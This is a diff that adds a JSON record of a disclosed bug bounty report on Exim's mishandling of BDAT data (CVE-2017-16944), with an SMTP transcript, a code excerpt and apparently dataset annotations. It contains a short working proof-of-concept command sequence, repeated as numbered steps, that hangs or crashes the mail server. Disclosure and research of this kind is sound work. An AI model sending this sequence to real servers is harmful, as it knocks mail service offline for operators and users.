@@ -1,0 +1,62 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "mehqq ",
+  "title": "Exim handles BDAT data incorrectly and leads to crash/hang",
+  "content": "\nOriginal article is here\nIncorrect BDAT data handling leads to DoS\nVulnerability Analysis\nWhen receiving data with BDAT command, SMTP server should not consider a single dot \u2018.\u2019 in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:\nCode 384 Bytes\n1220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800\n2EHLO test\n3250-devco.re Hello root at test\n4250-SIZE 52428800\n5250-8BITMIME\n6250-PIPELINING\n7250-AUTH PLAIN LOGIN CRAM-MD5\n8250-CHUNKING\n9250-STARTTLS\n10250-PRDR\n11250 HELP\n12MAIL FROM:<meh@some.domain>\n13250 OK\n14RCPT TO:<meh@some.domain>\n15250 Accepted\n16BDAT 10\n17.\n18250- 10 byte chunk, total 0\n19250 OK id=1eJFGW-000CB0-1R\nAs we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer receive_getc is not reset. If the next command is also a BDAT, receive_getc and lwr_receive_getc become the same and an infinite loop occurs inside bdat_getc. Program crashes due to stack exhaustion.\nsmtp_in.c: 546 bdat_getc\nCode 80 Bytes\n1  if (chunking_data_left > 0)\n2    return lwr_receive_getc(chunking_data_left--);\nThis is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.\nCode 185 Bytes\n1# CVE-2017-16944 PoC by meh at DEVCORE\n2\n3EHLO localhost\n4MAIL FROM:<meh@some.domain>\n5RCPT TO:<meh@some.domain>\n6BDAT 100\n7.\n8MAIL FROM:<meh@some.domain>\n9RCPT TO:<meh@some.domain>\n10BDAT 0 LAST\nThis makes attackers able to launch a resource based DoS attack and then force the whole server down.\nImpact\nMake mail server process crash or hang. Attackers may launch a resource based DoS attack and then force the whole server down.\n\n",
+  "severity": [
+    7.5,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Uncontrolled Resource Consumption"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1573620420,
+  "report_url": "https://hackerone.com/reports/296994",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "EHLO localhost"
+    ],
+    [
+      2,
+      "MAIL FROM:<meh@some.domain>"
+    ],
+    [
+      3,
+      "RCPT TO:<meh@some.domain>"
+    ],
+    [
+      4,
+      "BDAT 100"
+    ],
+    [
+      5,
+      "."
+    ],
+    [
+      6,
+      "MAIL FROM:<meh@some.domain>"
+    ],
+    [
+      7,
+      "RCPT TO:<meh@some.domain>"
+    ],
+    [
+      8,
+      "BDAT 0 LAST"
+    ]
+  ],
+  "vuln_description": "Exim incorrectly handles BDAT data by considering a single dot '.' in a line as the end of the message during header parsing. This causes the function pointer receive_getc to not reset, leading to an infinite loop in bdat_getc when another BDAT command is issued, resulting in a crash or hang due to stack exhaustion.",
+  "reason": "The vulnerability involves understanding SMTP protocol handling, specifically the BDAT command, and the internal state management of Exim's function pointers. The interaction between the BDAT command and the function pointer state is subtle and not immediately obvious.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
